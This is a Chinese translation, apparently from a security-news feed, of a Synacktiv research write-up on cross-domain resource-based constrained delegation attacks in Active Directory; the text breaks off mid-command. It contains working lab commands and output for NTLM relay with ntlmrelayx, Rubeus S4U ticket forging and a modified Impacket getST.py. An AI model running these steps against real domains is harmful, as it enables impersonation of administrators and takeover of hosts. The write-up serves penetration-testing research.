---
title: 探索跨域与跨森林的 RBCD 攻击
url: https://mp.weixin.qq.com/s/L8DsJD-Bdm_CIshxl9JPGQ
source: Doonsec's feed
date: 2026-03-25
fetch_date: 2026-03-26T04:28:32.221283
---

# 探索跨域与跨森林的 RBCD 攻击

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/h4gtbB74nSgxNAt1LbAO7iaEoBaN545O7hZpBcL5WAeWHWnicH68uGK1r6BpqM8w8b3OSaFaM3jCychPccAjLC4VBMdyHFdlXfcFlr8P4kRWk/0?wx_fmt=jpeg)

# 探索跨域与跨森林的 RBCD 攻击

Simon Msika
Simon Msika

securitainment

![]()

在小说阅读器中沉浸阅读

> 基于资源的约束委派 (RBCD) 攻击在渗透测试人员和攻击者中广为人知：通过修改机器账户的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性，攻击者可在目标机器上冒充任意用户。尽管这一攻击技术已在单域场景下被充分记录，且可借助 Impacket 或 Rubeus 工具实施，但专门讨论其在跨域和跨森林环境下实现的资料却寥寥无几。本文将介绍跨域和跨森林 RBCD 的完整攻击流程，并提供基于 Impacket 的脚本实现。

| 原文链接 | 作者 |
| --- | --- |
| https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html | Simon Msika |

## 引言

近期，我们遇到了一个特殊场景：可以修改某 Active Directory 域中服务器的 `msDS-AllowedToActOnBehalfOfOtherIdentity`属性。这一条件自然地引导我们考虑基于资源的约束委派攻击 (RBCD)——该攻击在渗透测试圈已有数年历史，且文档资料十分完善。

然而，我们在目标域上并没有任何账户，仅持有一个子域上的账户。在研究如何在这一跨域环境中实施该攻击时，我们发现现有的 Impacket 工具并不支持跨域 RBCD 操作。

由于此前针对这一跨域 RBCD 攻击路径的公开描述极为有限，这促使我们深入研究跨域环境下的 RBCD 工作流程。

## 实施跨域 RBCD

### 实验环境搭建

为了研究跨域 RBCD，我们构建了两个域：主域 `asgard.local`和子域 `dev.asgard.local`。在 `asgard.local`域中，我们加入了一台工作站（命名为 `workstation`），作为本次 RBCD 攻击的目标。

在 dev.asgard.local 中，我们创建了计算机对象 `rbcd_test$`：

```
python3 addcomputer.py dev.asgard.local/thor_dev:'[...]' -dc-ip 192.168.90.131 -computer-name rbcd_test -computer-pass '[...]'
```

随后，我们将 `rbcd_test$@dev.asgard.local`账户添加到 `workstation$.asgard.local`对象的 `msDS-AllowedToActOnBehalfOfOtherIdentity`字段，使其具备执行 RBCD 工作流的权限。

为此，我们模拟真实渗透测试中的操作，实施了 NTLM 中继攻击，并使用 Impacket 的 ntlmrelayx.py 脚本。由于 `rbcd_test$@dev.asgard.local`并非 `asgard.local`域的成员，目标域的 LDAP 中不存在该账户记录，因此命令行中须改用 `rbcd_test$`对象的 SID。

我们使用了如下命令：

```
$ sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 --no-dump --no-da --no-validate-privs --delegate-access --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 --sid
[...]
[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /21i/pipe/srvsvc
[*] HTTPD(80): Connection from 192.168.90.190 controlled, attacking target ldap://192.168.90.217
[*] HTTPD(80): Authenticating against ldap://192.168.90.217 as ASGARD/WORKSTATION$ SUCCEED
[*] Assuming relayed user has privileges to escalate an user via ACL attack
[-] User not found in LDAP: S-1-5-21-3104832133-133926542-3798009529-1106
[-] Unable to escalate without a valid user.
[*] Delegation rights modified succesfully!
[*] S-1-5-21-3104832133-133926542-3798009529-1106 can now impersonate users on WORKSTATION$ via S4U2Proxy
```

至此，委派关系已配置完毕。下一步目标是利用这一 RBCD 配置，在该工作站上冒充 `thor_adm@asgard.local`用户，进而实现对其的渗透。

### 跨域 RBCD 工作流

在查阅 RBCD 工作流各步骤所涉及的 Kerberos 协议文档时，我们找到了微软关于跨域 S4U2Self 的官方文档。

然而，关于跨域环境下的 S4U2Proxy（执行 RBCD 攻击同样不可或缺），我们未能找到任何相关资料。

好在 Rubeus 的 S4U.cs 文件中的 `CrossDomainS4U`函数已经实现了跨域 S4U2Self 和 S4U2Proxy！以下是跨域 RBCD 利用所涉及的完整步骤：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSj8hbVjiaxiarUyJp83zwVBjLyHp7Dl8eOMacx4ZZo0qv3mxqd9245JCu6ibXsvvPCuGN4ib8zLELVuxZYMwWMcicgSMVluxcgkMyHQ/640?wx_fmt=png&from=appmsg)

跨域 RBCD 中 Kerberos 交互示意图。

1. 从 `dev`域控制器获取 `rbcd_test$@dev.asgard.local`的 TGT。
2. 向 `dev`域控制器申请一个引用 TGT，以便向 `asgard.local`域控制器进行身份验证。
3. 凭借该票据，通过 S4U2Self 在 `asgard.local`域控制器上为 `thor_adm@asgard.local`用户获取“引用”ST。
4. 利用上述票据，再次通过 S4U2Self 在 `dev.asgard.local`域控制器上，为 `rbcd_test$@dev.asgard.local`服务获取 `thor_adm@asgard.local`用户的 ST。
5. 提供初始 TGT 和前一步获得的票据，通过 S4U2Proxy 向 `dev.asgard.local`域控制器申请引用票据。
6. 利用所获票据和引用 TGT，通过 S4U2Proxy 向 `asgard.local`域申请最终服务票据。

如上所述，在执行以下命令时，Rubeus 会自动完成上述全部步骤：

```
Rubeus.exe s4u /user:"rbcd_test$" /aes256:2b[...]b8fe /domain: dev.asgard.local /impersonateuser:thor_adm /msdsspn:"cifs/workstation.asgard.local" /targetdc:dc01.asgard.local /targetdomain:asgard.local /ptt /nowrap

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: C2354F843A6C52BC484522831DFA13531EB0F72DE9D9133EBEF447A5CF60F0E3
[*] Building AS-REQ (w/ preauth) for: 'dev.asgard.local\rbcd_test$'
[*] Using domain controller: 192.168.90.131:88
[+] TGT request successful!
[...]

[*] Action: S4U

[*] Performing cross domain constrained delegation
[*] Retrieving referral TGT from DEV.ASGARD.LOCAL for foreign domain, asgard.local, KRBTGT service
[*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
[*] Building TGS-REQ request for: 'krbtgt/asgard.local'
[*] Using domain controller: CHILD-DC.dev.asgard.local (192.168.90.131)
[+] TGS request successful!
[...]

  ServiceName              :  krbtgt/ASGARD.LOCAL
  ServiceRealm             :  DEV.ASGARD.LOCAL
  UserName                 :  rbcd_test$ (NT_PRINCIPAL)
  UserRealm                :  DEV.ASGARD.LOCAL
  StartTime                :  04/11/2025 17:32:38
  EndTime                  :  05/11/2025 03:32:38
  RenewTill                :  11/11/2025 17:32:38
  Flags                    :  name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  5Qsm4lJIOWsjZL8fyCgAJA==

[*] Retrieving the S4U2Self referral from asgard.local
[*] Using domain controller: dc01.asgard.local (192.168.90.217)
[*] Requesting the cross realm 'S4U2Self' for thor_adm@asgard.local from dc01.asgard.local
[*] Sending cross realm S4U2Self request
[+] cross realm S4U2Self success!
[...]

[*] Requesting the S4U2Self ticket from DEV.ASGARD.LOCAL
[*] Using domain controller: CHILD-DC.dev.asgard.local (192.168.90.131)
[*] Requesting the cross realm 'S4U2Self' for thor_adm@asgard.local from
[*] Sending cross realm S4U2Self request
[+] cross realm S4U2Self success!
[...]

[*] Using domain controller: CHILD-DC.dev.asgard.local (192.168.90.131)
[*] Building S4U2proxy request for service: 'cifs/workstation.asgard.local' on
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[...]

[*] Using domain controller: dc01.asgard.local (192.168.90.217)
[*] Building S4U2proxy request for service: 'cifs/workstation.asgard.local' on dc01.asgard.local
[*] Sending S4U2proxy request
[+] S4U2proxy success!
[...]

[+] Ticket successfully imported!
```

票据导入后，即可使用它访问 `workstation.asgard.local`的 `C$`共享：

```
dir \\workstation.asgard.local\c$

    Répertoire : \\workstation.asgard.local\c$

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        14/04/2025     09:51                inetpub
d-----        07/12/2019     10:14                PerfLogs
d-r---        05/05/2025     17:13                Program Files
d-r---        16/01/2025     18:20                Program Files (x86)
d-r---        30/10/2025     16:17                Users
d-----        28/05/2025     14:35                Windows
-a----        22/02/2024     01:33         112136 appverifUI.dll
-a----        28/05/2025     14:51         154093 log.txt
-a----        22/02/2024     01:34          66328 vfcompat.dll
```

### 在 Linux 上：基于 Impacket 的实现

用 Rubeus 完成攻击后，我们想进一步确认该攻击是否同样可以用 Impacket 实现。遗憾的是，Impacket 套件中的 getST.py 脚本无法直接用于执行 S4U2Self 和 S4U2Proxy 步骤。

首先，通过分析一次成功的跨域 RBCD 过程的 PCAP，我们发现在步骤 3 至 6 中请求服务票据时，请求体中的 realm 与用于发起 TGS-REQ 的票据所声明的 realm 并不一致：

![](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nShDQmn9zsovx7lYAka4WDtL5DYSqj9AwIKnEjUw6e3b71aPozu3SyYT15Cw4e1KN1NLQtYdIKM1LSKp3Dyb3xib85PbExoG23hY/640?wx_fmt=png&from=appmsg)

Wireshark 抓包：提供的票据与 ST 请求中的 realm 不同。

而现有版本的 Impacket getST.py 并不支持在 Kerberos 请求中手动指定 realm，因为 realm 始终是**从**请求所附带的票据中读取的：

```
defdoS4U(self, tgt, cipher, oldSessionKey, sessionKey, nthash, aesKey, kdcHost):
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]
# Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

[...]
        reqBody['realm'] =str(decodedTGT['crealm'])
```

此外，现有实现仅支持单独执行 S4U2Self 步骤（步骤 3/4），或将 S4U2Self 与 S4U2Proxy 串联执行——S4U2Proxy 步骤无法独立调用。

为此，我们参照 Rubeus 的实现思路，在 Impacket 的 getST.py 中添加了跨域 RBCD 攻击的支持。该脚本现已发布于此处。

使用本脚本时，需额外提供以下参数：

* 第一个目标 DC 的 IP，即已控账户所在域的域控制器（`-dc-ip`）；
* 目标域（`-targetdomain`）；
* 目标 DC 的 IP，即被冒充账户所在域的域控制器（`-targetdc`）。

在我们的测试场景中，完整的利用命令如下：

```
$ python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k -dc-ip 192.168.90.131 -targetdc 192.168.90.217 -impersonate tho...